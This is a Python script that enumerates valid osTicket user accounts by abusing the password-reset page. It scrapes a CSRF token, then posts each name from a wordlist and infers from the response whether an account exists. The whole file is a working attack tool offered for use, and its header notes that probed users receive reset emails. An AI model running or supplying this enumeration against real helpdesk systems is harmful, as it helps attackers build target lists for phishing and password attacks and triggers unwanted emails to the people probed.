#!/usr/bin/python3

################################################################
#
# This script takes in a text file of usernames and/or emails
# and tests to see whether they are valid users or not. Note
# that if the username or email exists, they will get an email
# about a password reset and may be alerted. This does not work
# for agents, but only for users. To brute force enumerate
# admins/agents, use ostAgentDiscovery.py. 
# 
# Note - this was tested on Debian 11 with osTicket 1.12
# (https://github.com/osTicket/osTicket/releases)
# 
# Example: python3 ostUserDiscovery.py -d https://my.domain.com
#              -f ~/usernames.txt
#
# Use the command `python3 ostUserDiscovery.py -h` for help.
# 
################################################################


### IMPORTS ###
import requests, argparse
from bs4 import BeautifulSoup



### ARGUMENT PARSING ###
parser = argparse.ArgumentParser()
parser.add_argument('-d', "--domain", type=str, required=True, help="osTicket domain, example - https://os.ticket.com")
parser.add_argument('-f', "--file", type=str, required=True, help="Line-separated text file of usernames or emails to test")
parser.add_argument('-v', "--verbose", action="store_true", help="Print out the results of each username/email")
args = parser.parse_args()

# open file of usernames
try:
    file = open(args.file, "r")
    usernames = file.read().split("\n")
except:
    print("[-] Error opening file",args.file)
    quit()



### GET CSRF VALUE AND TEMP SESSION COOKIE ###
print("[+] Getting CSRF token...")
URL = args.domain+"/pwreset.php"
headers = {}

# make request
try:
    result = requests.request("GET", URL)
except Exception as e:
    print("[-] Error making request")
    print(e)
    quit()

# parse CSRF token value and cookie
html = BeautifulSoup(result.text, "html.parser")
CSRF_TOKEN = html.find_all("input", {"name":"__CSRFToken__"})[0]["value"]
headers["Cookie"] = result.headers['Set-Cookie'].split(";")[0]



### ENUMERATE USERS ###
print("[+] Enumerating users...")
headers["Content-Type"] = "application/x-www-form-urlencoded"

for username in usernames:
    payload = f"__CSRFToken__={CSRF_TOKEN}&do=sendmail&userid={username}"

    # make request
    try:
        result = requests.request("POST", URL, headers=headers, data=payload)
    except Exception as e:
        print("[-] Error making request")
        print(e)
        quit()

    # parse response
    html = BeautifulSoup(result.text, "html.parser")
    if len(html.find_all("input", {"name":"do"})) == 0:
        print("  [+] '"+username+"' user found")
    elif args.verbose:
        print("  [-] '"+username+"' user not found")